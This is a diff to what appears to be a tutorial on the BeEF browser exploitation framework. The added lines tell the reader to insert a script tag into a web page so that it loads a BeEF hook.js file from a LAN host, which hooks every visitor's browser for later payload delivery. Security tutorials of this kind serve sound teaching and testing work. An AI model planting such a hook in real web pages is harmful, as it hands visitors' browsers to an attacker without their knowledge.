@@ -77,7 +77,12 @@ So if you have an html page that you would like to embed into, feel free.
 
 However, we have already created a page which performs dynamic embedding of the BeEF hook.
 
-This page is located at [http://127.0.0.1/beef/hook.php](http://127.0.0.1/beef/hook.php)
+
+This page is located at: /var/www/html/beef/hook.php
+Just insert this line to it:
+
+`<script src='http://192.168.1.109:3000/hook.js'></script>`
+
 
 Open up a new Firefox instance by either running this command:
 
@@ -159,5 +164,4 @@ It should be noted that this method can be used to deliver anything, not just th
 simply by updating the module options before execution.
 
 There are tons of other modules available in BeEF, don't stop here. Get exploring.
-
 
